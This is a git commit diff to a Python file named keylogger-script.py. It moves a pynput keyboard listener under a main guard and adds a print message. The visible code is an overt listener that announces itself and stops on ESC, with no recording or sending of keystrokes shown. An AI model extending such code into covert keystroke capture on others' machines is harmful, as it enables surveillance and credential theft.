77026e6f50bf4a9c0e654b679a866a19c2f4d40c
tech-Bello <muhammard2k01bello@gmail.com>
2026-03-23 23:45:15 +0100

    added if main is name

--- keylogger-script.py
+++ keylogger-script.py
@@ -10,6 +10,8 @@ def on_release(key):
     if key == keyboard.Key.esc:
         return False  # Stop listener
 
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    print("Press keys (ESC to stop)...")
-    listener.join()
+if __name__ == "__main__":
+    print("start to listen ur keys")
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        print("Press keys (ESC to stop)...")
+        listener.join()
